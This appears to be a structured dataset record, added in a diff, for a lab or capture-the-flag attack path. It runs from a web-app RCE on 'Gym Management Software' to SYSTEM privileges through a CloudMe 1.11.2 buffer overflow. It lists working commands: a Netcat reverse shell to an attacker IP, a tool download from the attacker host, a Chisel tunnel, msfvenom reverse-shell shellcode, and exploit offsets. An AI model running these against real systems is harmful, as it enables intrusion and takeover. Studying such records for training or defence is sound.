@@ -1,0 +1,169 @@
+{
+  "id": "ap-0030",
+  "title": "Windows Privilege Escalation via Stack-based Buffer Overflow in CloudMe",
+  "summary": "Initial remote compromise achieved through an unauthenticated exploit against 'Gym Management Software' resulting in a web shell, followed by privilege escalation using a stack-based Buffer Overflow targeting the locally running CloudMe 1.11.2 service.",
+  "attack_path_markdown": "### Step 1\nInitial enumeration identified open ports 8080 (HTTP) and 7680, and the OS (Windows, TTL 128).\n### Step 2\nAn unauthenticated RCE exploit for 'Gym Management Software' was used to upload a webshell.\n### Step 3\nInitial shell access gained via the webshell by executing a Netcat reverse shell.\n### Step 4\nSystem enumeration (WinPEAS) identified the locally running CloudMe 1.11.2 service on port 8888.\n### Step 5\nA Chisel tunnel was established to access the restricted local service remotely.\n### Step 6\nA custom Buffer Overflow exploit was crafted, calculating the 1052 byte offset and utilizing a JMP ESP instruction found in Qt5Core.dll to execute shellcode and gain a privileged shell.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Scanning the target to identify active status, operating system, open ports, and running services.",
+      "actions": [
+        "Perform network connectivity check.",
+        "Determine the target operating system via TTL.",
+        "Execute a full TCP port scan (65535 ports) and export results in grepable format.",
+        "Identify technologies running on the open web port."
+      ],
+      "tools": ["ping", "nmap", "whatweb", "bat (for displaying nmap output)"],
+      "techniques": ["Active Scanning", "OS Fingerprinting", "Service Discovery"],
+      "mitre_ids": ["T1595"],
+      "commands": [
+        "ping 10.10.10.198",
+        "nmap -p- -T5 --open -sT --min-rate 5000 -vvv -n -oG ports 10.10.10.198"
+      ],
+      "indicators": ["TTL 128 (Windows)", "Ports 8080 and 7680 open [3, 4]", "Gym Management Software/PHP detected on 8080"],
+      "preconditions": "Network connectivity to the target.",
+      "expected_outcome": "Identified web service on 8080 running 'Gym Management Software'.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Acquiring the necessary exploit for the identified web application vulnerability and preparing post-exploitation tools (shell, tunneling, debugging).",
+      "actions": [
+        "Search for public exploits for the web application.",
+        "Acquire binaries for Netcat, Chisel, WinPEAS, and Immunity Debugger."
+      ],
+      "tools": ["searchsploit", "nc.exe", "Chisel", "WinPEAS.exe", "Immunity Debugger"],
+      "techniques": ["Vulnerability Research", "Staging Tools"],
+      "mitre_ids": ["T1588.002"],
+      "commands": [
+        "searchsploit gym management software",
+        "impacket-smbserver.py smb_folder /path/to/current/directory"
+      ],
+      "indicators": ["Exploit found (RCE/File Upload)", "Netcat binary prepared for transfer"],
+      "preconditions": "Attacker machine configured with SMB/HTTP server.",
+      "expected_outcome": "Exploit script and shell binaries prepared.",
+      "confidence": 0.8
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Executing the exploit to upload a web shell containing command injection capabilities.",
+      "actions": [
+        "Execute the Python exploit script targeting the web application URL.",
+        "Validate the web shell access by issuing a command."
+      ],
+      "tools": ["Custom Python Exploit"],
+      "techniques": ["Exploit Public-Facing Application (RCE/File Upload)"],
+      "mitre_ids": ["T1190"],
+      "commands": [
+        "python gym_management_exploit.py http://10.10.10.198:8080",
+        "http://10.10.10.198:8080/upload/kamehameha.php?telepati=ipconfig"
+      ],
+      "indicators": ["Webshell accessible and responsive"],
+      "preconditions": "Vulnerable web application running.",
+      "expected_outcome": "Remote command execution capability established.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Using the web shell to establish a persistent reverse shell connection to the attacker machine, gaining initial low-privilege access ('zone').",
+      "actions": [
+        "Setup Netcat listener on the attacker machine.",
+        "Transfer and execute Netcat binary via SMB/HTTP using command injection."
+      ],
+      "tools": ["nc.exe", "Netcat (Listener)"],
+      "techniques": ["Reverse Shell", "Command and Scripting Interpreter (CMD)"],
+      "mitre_ids": ["T1059.003"],
+      "commands": [
+        "nc -lvnp 443",
+        "\\\\10.10.14.29\\smb_folder\\nc.exe -e cmd.exe 10.10.14.29 443"
+      ],
+      "indicators": ["Reverse shell connection received as user 'zone'"],
+      "preconditions": "Webshell access, Netcat listener active.",
+      "expected_outcome": "Interactive command shell as user 'zone'.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "System enumeration to identify local privilege escalation vectors, specifically focusing on vulnerable services.",
+      "actions": [
+        "Transfer WinPEAS binary to the victim machine via HTTP server.",
+        "Execute WinPEAS and analyze output for running services and file permissions.",
+        "Identify CloudMe 1.11.2 running locally on port 8888."
+      ],
+      "tools": ["curl", "WinPEAS.exe", "netstat"],
+      "techniques": ["System Enumeration", "Discover Running Processes"],
+      "mitre_ids": ["T1082", "T1057"],
+      "commands": [
+        "curl http://10.10.14.29:8080/winpeas.exe -o winpeas.exe",
+        ".\\winpeas.exe",
+        "netstat -ano | findstr 8888"
+      ],
+      "indicators": ["CloudMe 1.11.2.exe found", "Port 8888 open locally"],
+      "preconditions": "Initial user access to the victim machine.",
+      "expected_outcome": "Identification of CloudMe 1.11.2 as a potential Buffer Overflow vector.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Establishing remote access to the local CloudMe service and preparing the custom shellcode/payload for privilege escalation.",
+      "actions": [
+        "Set up Chisel server on the attacker machine for reverse tunneling.",
+        "Run Chisel client on the victim machine to tunnel local port 8888 to the attacker's machine.",
+        "Use Msfvenom to generate shellcode (reverse TCP) excluding null byte (and optionally \\x0a, \\x0d)."
+      ],
+      "tools": ["Chisel", "msfvenom", "Immunity Debugger", "mona.py"],
+      "techniques": ["Tunnelling (Chisel) [20, 21]", "Exploit Development (Pattern Creation/Offset Calculation/JMP ESP)"],
+      "mitre_ids": ["T1572", "T1068"],
+      "commands": [
+        "./chisel server -reverse -port 1234",
+        "chisel.exe client 10.10.14.29:1234 R:8888:127.0.0.1:8888",
+        "pattern_create.rb -l 5000",
+        "pattern_offset.rb -q 30426a31 (for offset 1052 bytes)",
+        "mona find -type jmp -p esp -m Qt5Core.dll",
+        "msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.29 LPORT=443 PLATFORM=windows ARCH=x86 -f c -b \"\\x00\\x0a\\x0d\" --encoder x86/shikata_ga_nai"
+      ],
+      "indicators": ["Tunnel established (8888 reachable on attacker side)", "Offset 1052 identified", "JMP ESP address found in Qt5Core.dll (e.g., 0x68a98a7b)"],
+      "preconditions": "CloudMe service running, Chisel deployed .",
+      "expected_outcome": "Exploit ready to deliver SYSTEM shell.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Executing the Buffer Overflow payload (containing JMP ESP address and shellcode) via the tunnel to gain SYSTEM privileges.",
+      "actions": [
+        "Replace the EIP address in the payload with the JMP ESP address (0x68a98a7b in reverse order: \\x7b\\x8a\\xa9\\x68).",
+        "Inject the final shellcode, preceded by an instruction to shift the stack (Sub ESP) to allow shellcode decoding time.",
+        "Set up the final Netcat listener and execute the custom Python exploit.",
+        "Retrieve the root flag."
+      ],
+      "tools": ["Custom Python Exploit", "Netcat (Listener)"],
+      "techniques": ["Buffer Overflow Exploitation", "Exploitation for Privilege Escalation (Local)"],
+      "mitre_ids": ["T1068"],
+      "commands": [
+        "nc -lvnp 443",
+        "python3 exploit.py",
+        "type C:\\Users\\Administrator\\Desktop\\root.txt"
+      ],
+      "indicators": ["SYSTEM-level reverse shell received"],
+      "preconditions": "Successful determination of offset and JMP ESP address.",
+      "expected_outcome": "Maximum privileges obtained (Administrator/SYSTEM).",
+      "confidence": 0.9
+    }
+  ],
+  "tactics": ["Initial Access", "Execution", "Privilege Escalation", "Command and Control", "Defense Evasion"],
+  "techniques": ["Unauthenticated RCE", "Buffer Overflow", "JMP ESP", "Shellcode Injection", "Tunnelling"],
+  "mitre_ids": ["T1190", "T1068", "T1572"],
+  "hosts": ["10.10.10.198", "10.10.14.29"],
+  "privs_obtained": ["zone (low-privilege user)", "Administrator / SYSTEM"],
+  "confidence": 0.95,
+  "source_file": "",
+  "notes": "The Buffer Overflow required manual debugging (Immunity Debugger) to find the correct offset and exploit address [23, 32]. A stack displacement (Sub ESP) was used instead of traditional NOPS for reliability [33]. The service (CloudMe) was unstable and required multiple attempts to gain the final shell [29, 34].",
+  "labels": ["buffer_overflow", "privilege_escalation", "windows"]
+}
